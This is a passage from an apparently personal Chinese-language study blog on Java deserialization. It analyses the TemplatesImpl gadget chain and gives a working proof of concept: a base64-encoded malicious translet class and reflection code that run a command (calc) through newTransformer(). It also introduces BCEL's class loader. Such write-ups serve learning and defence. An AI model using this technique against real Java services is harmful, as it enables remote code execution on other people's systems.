TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>接着找调用defineClas的调用处<code>defineTransdletClasses()</code></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            <span class="comment">// ...下面不贴了</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>再往上找，<code>getTransletInstance()</code>中有调用，还是private，再往上</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ... 略</span></span><br></pre></td></tr></table></figure></li><li><p>终于到一个public的方法，再看看注释</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Implements JAXP&#x27;s Templates.newTransformer()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>最后亮出<strong>Gadget</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer()</span><br><span class="line">    TemplatesImpl#getTransletInstance()</span><br><span class="line">        TemplatesImpl#defineTransletClasses()</span><br><span class="line">            TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure></li><li><p>还要分析怎么利用才行，show me your poc</p><ol><li><p>先从sink到调用处分析，先看看这两个属性</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Contains the actual class definition for the translet class and</span></span><br><span class="line"><span class="comment"> * any auxiliary classes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Contains the translet class definition(s). These are created when</span></span><br><span class="line"><span class="comment"> * this Templates is created or when it is read back from disk.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> Class[] _class = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li><li><p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code>可以知道只要将恶意类的代码放到<code>_bytecodes[i]</code>即可，会自动加载类代码</p></li><li><p>来到TemplatesImpl#getTransletInstance(): <code>if (_name == null) return null;if (_class == null) defineTransletClasses();</code>这一行中<strong>req1: 要_name不为bull，_class为null</strong></p></li><li><p>来到newTransformer()中，有用到_开头的变量，应该是该类变量，正常调用就会调用链子</p></li><li><p>还是得顺着回去来一遍</p><ol><li><p>newTransformer中 <strong>req2: <code>_tfactory</code>有进行函数调用，没说为nullable</strong> ，不能为null，其他变量先为null问题不大</p></li><li><p>getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>会<strong>对_class进行一次反射调用</strong>，不能为null，<strong>但是要调用到defineTrnasletClasses需要它为null(前面有说过了)</strong></p></li><li><p>defineTransletClasses中发现面这句话，_transletIndex应该不用进行设定，会在这里进行遍历，不过这个反射实例化的类得看一看，<strong>必须是AbstrtactTranslet的子类</strong>，看看构造函数怎么办，搜<code>_class</code></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>关于<code>_class</code>的设置发现这defineTransletClasses里有，<strong>req4: 所以我们传入的<code>_bytecodes</code>必须是AbstractTranslet的子类</strong></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">_class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br></pre></td></tr></table></figure></li><li><p>触发恶意代码：AbstractTranslet子类会把<code>_class[_transletIndex]</code>进行实例化，写在构造函数里就好了</p></li></ol></li><li><p><em><strong>总结一下要求</strong></em>(关注必须的就ok)</p><ol><li><code>_tfactory</code>不为null –&gt; 其实这里也非强制，虽然没有@Nullable，但是因为比较慢调用，而且动态类型不会编译错误</li><li><code>_name</code>不为null，<code>_class</code>为null</li><li><code>_bytecodes[i]</code>需要时AbstractTranslet的子类，中有恶意类代码</li><li>构造函数是私有的，通过反射进行创建？其实不用，使用公共的构造器就ok了</li></ol></li></ol></li></ol><h4 id="TemplatesImpl-poc"><a href="#TemplatesImpl-poc" class="headerlink" title="TemplatesImpl poc"></a>TemplatesImpl poc</h4><blockquote><ol><li>注意的点<ol><li>这一条Gadget构造时比较特殊的条件是这个_bytecodes这里需要是<code>AbstractTranslet</code>的子类，一开始倒也不用看很细，后面报错&#x2F;调试也可以发现的，关键代码在getTransletInstance中<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code></li><li>调用点在<code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>，发现这里其实只要抓住_bytecodes[i]就好</li></ol></li><li>总的来说，找条件时要细心一点，链子poc重点在于：调用链，触发点</li></ol></blockquote><ol><li>最终虽然会报错但是也会成功弹出来calc，利用成功</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TemplatesImplPayload.java 我的恶意类，在构造函数中执行命令即可，内部会有newInstance()</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesImplPayload</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TemplatesImplRCE.java</span></span><br><span class="line">    <span class="comment">// poc触发，最终payload其实是triggerObj这个对象，在通过newTransformer方法触发链子</span></span><br><span class="line"><span class="keyword">package</span> ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.utils.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplRCE</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">/* * * * * * 1. 获取Templ...对象 * * * * * */</span></span><br><span class="line">            <span class="type">TemplatesImpl</span> <span class="variable">triggerObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 2. 反射构造调用条件 * * * * * */</span></span><br><span class="line">            <span class="comment">// 0. payload: javac TemplatesImpPayload.java &amp;&amp; cat TemplatesImplRCE.class | base64</span></span><br><span class="line">            <span class="type">byte</span>[] payload = Base64.decode(<span class="string">&quot;yv66vgAAADMAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClW&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAB4HABwBAAl0cmFuc2Zv&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;cm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20v&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;c3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;ZXI7KVYBAApFeGNlcHRpb25zBwAgAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;SXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJp&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YWxpemF0aW9uSGFuZGxlcjspVgEAClNvdXJjZUZpbGUBABlUZW1wbGF0ZXNJbXBsUGF5bG9hZC5q&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;YXZhDAAJAAoHACEMACIAIwEABGNhbGMMACQAJQEAE2phdmEvbGFuZy9FeGNlcHRpb24MACYACgEA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;FFRlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;L3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxh&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;bi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAK&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;Z2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9T&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;dHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AQAJAAoAAQALAAAAYAACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAM&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;AAAAGgAGAAAACgAEAAwADQAPABAADQARAA4AFQAQAA0AAAAQAAL/ABAAAQcADgABBwAPBAABABAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;EQACAAsAAAAZAAAAAwAAAAGxAAAAAQAMAAAABgABAAAAFgASAAAABAABABMAAQAQABQAAgALAAAA&quot;</span>+</span><br><span class="line">                                            <span class="string">&quot;GQAAAAQAAAABsQAAAAEADAAAAAYAAQAAABsAEgAAAAQAAQATAAEAFQAAAAIAFg==&quot;</span>);</span><br><span class="line">            <span class="comment">// 1. 设置_name</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">            <span class="comment">// 2. 设置_bytecodes，放入恶意类就好</span></span><br><span class="line">            setFieldValue(triggerObj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;payload&#125;);</span><br><span class="line">            <span class="comment">// 3. 设置_tfactory，从类中copy的</span></span><br><span class="line">            setFieldValue(triggerObj,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() );</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* * * * * * 3. 触发调用点 * * * * * */</span></span><br><span class="line">            triggerObj.newTransformer();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field_name, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field_name);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(obj, value);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="补充-对于-tfactory参数一些误解的修正"><a href="#补充-对于-tfactory参数一些误解的修正" class="headerlink" title="补充: 对于_tfactory参数一些误解的修正"></a>补充: 对于_tfactory参数一些误解的修正</h4><blockquote><p>对于反序列化和序列化还要<strong>注意一下transient这个修饰符</strong></p></blockquote><ol><li>(新的点)首先，<code>private transient TransformerFactoryImpl _tfactory = null;</code>中这个属性是无法被序列化的，查看该类的readObject()后发现在函数尾部有<code>_tfactory = new TransformerFactoryImpl();</code><ol><li><strong>所以<code>setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</code>有没有都不改变结果</strong></li></ol></li><li>(上面已经发现)其次从顺序角度来看，即使不进行设置，后续由于调用顺序，也会先加载完我们这个类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span></span><br><span class="line">      <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="literal">null</span> || !(temp.length()==<span class="number">0</span> || temp.equalsIgnoreCase(<span class="string">&quot;true&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.DESERIALIZE_TRANSLET_ERR);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        is.defaultReadObject();</span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><h4 id="什么是BCEL"><a href="#什么是BCEL" class="headerlink" title="什么是BCEL"></a>什么是BCEL</h4><blockquote><p>BCEL的特点在于动态加载字节码，defineClass()也是，这里都是反序列化时的中一个重点<br>在Fastjson漏洞中有所利用</p></blockquote><ol><li><p>BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，比Commons Collections特殊的一点是，<strong>它被包含在了原生的JDKcom.sun.org.apache.bcel中</strong></p><ol><li>BCEL 提供了两个核心类，即 com.sun.org.apache.bcel.internal.Repository 和 com.sun.org.apache.bcel.internal.Utility<ol><li>Repository 用于管理已加载的类和其对应的字节码信息，其提供了一个 lookupClass 用以查找已加载的类；</li><li>Utility 则提供了一系列静态方法用于操作字节码，例如对打印或编码字节码。</li></ol></li></ol></li><li><p>BCEL的主要特点包括: BCEL库提供了一系列用于分析、创建、修改Java Class文件的API</p><ol><li>字节码分析：能够解析已有的.class文件，提取其中的方法、字段、属性等信息。</li><li><strong>字节码生成</strong>：支持从头开始构建新的Java类文件，这在需要动态生成类的场景下非常有用。</li><li><strong>字节码转换</strong>：可以在运行时修改现有的字节码，例如插入额外的指令来实现性能监视或安全性检查。</li><li>字节码优化：可以对字节码进行优化，提高程序执行效率</li></ol></li><li><p>BCEL还实现了自己的ClassLoader: <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>，重写了Java内置的ClassLoader#loadClass()方法，并提供了多种对字节码的操作(新方法)</p><ol><li>这里会判断是否为<code>$$BCEL$$</code>开头，然后进入createClass()，进入createClass后会对字节码进行decode()，最终的字节码格式是被BCEL自定义的 –&gt; <strong>所以需要自己的ClassLoader</strong>，在ClassLoader#loadClass()中，其会判断类名是否是<code>$$BCEL$$</code>开头，如果是的话，将会对这个字符串进行decode。</li><li>p牛说decode()中: “基本可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩”，我就先不看了有需要再来</li></ol> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line"><span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First try: lookup hash table.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>((cl=(Class)classes.get(class_name)) == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">/* Second try: Load system class using system class loader. You better</span></span><br><span class="line"><span class="comment">     * don&#x27;t mess around with them.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; ignored_packages.length; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(class_name.startsWith(ignored_packages[i])) &#123;</span><br><span class="line">        cl = deferTo.loadClass(class_name);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">JavaClass</span> <span 